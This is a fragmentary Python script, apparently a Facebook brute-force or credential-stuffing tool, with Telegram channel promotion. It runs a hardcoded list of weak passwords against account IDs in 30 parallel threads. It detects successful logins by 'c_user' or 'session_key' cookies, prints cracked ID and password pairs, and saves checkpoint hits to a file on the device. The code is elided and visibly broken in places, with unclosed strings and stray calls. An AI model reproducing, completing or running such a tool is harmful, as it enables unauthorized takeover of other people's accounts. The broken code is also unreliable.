...
time.sleep(2)
os.system(f'xdg-open-https://t.me/BBVYV')
logo = ("""\033[1;31m
🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦🟦🟦🟦🟦🟦⬜⬜⬜⬜🟦🟦
...
def menu():
        ...
        try:
                ...
                if "server on" in sj:
                        ...
                        print('\x1b[1;91m [1] \033[1;31mfile\n ')
                        linex()
                        xd=input(' Choose ➜ ')
                        if xd in ['1','01']:
                                ...
                                clear()
                                linex()
                                print('\x1b[1;93m 1. \x1b[1;92mmethod ID \n \x1b[1;93m2. \x1b[1;92mmethod NEW \n\x1b[1;93m 3. \x1b[1;92mmethod VIP \n\x1b[1;93m 4. \x1b[1;92mmethod MIX')
                                linex()
                                mthd=input('\x1b[1;97m Choose: ')
                                plist = []
                                clear()
                                linex()
                                print(' \033[0;1m[ \033[31;1m1 \033[0;1m] MIX - Auto  ')
                                print(' \033[0;1m[ \033[31;1m2 \033[0;1m] MIX - yuo')
								
								
                                linex()
                                ppp=input(' Choose: ')
                                if ppp in ['1','01']:
                                    append('qwertyuiopasdfghjkl')
                                    plist.append('zzxxcczzxxcc')
                                    plist.append('1235412354')
                                    ...
                                    plist.append('20242024')
                                        ...
                                        try:
                                                linex()
                                                ps_limit = int(input('عدد الباسوردات '))
                                        except:
                                                ps_limit =1
                                        linex()
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print("\033[1;34m User  @GxGGY")
                                        print("\033[1;34m User @m_2_v ")
                                        linex()
                                ...
                                os.system(f'xdg-open https://t.me/BBVYV');menu()
                        elif xd in ['7','07']:
                                crack()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://t.me/BBVYV);menu()
                        elif xd in ['9','09']:
                                sep()  
                        elif xd in ['10','10']:
                                double()                              
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [\033[1;36mMIX\033[1;37m] \033[1;37m[\033[1;31m%s\033[1;37m] \033[1;37m[\033[1;32mOK\033[1;30m:-\033[1;32m%s\033[2;32m] \033[2;32m[\033[2;32m%s%%\033[2;32m]\033[2;32m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    'viewport-width': '980',
                        ...
                        if "c_user" in ASX:
                                print('\33[1;92m[MIX-OK] '+ids+' | '+pas+'\33[0;97m')
                                ...
                                if 'y' in pcp:
                                        print('\33[1;93m[MIX-CP] '+ids+' | '+pas+'\33[0;97m')
    ...
    'viewport-width': '980',
                        ...
                        if 'session_key' in po:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [MIX-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MIX-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
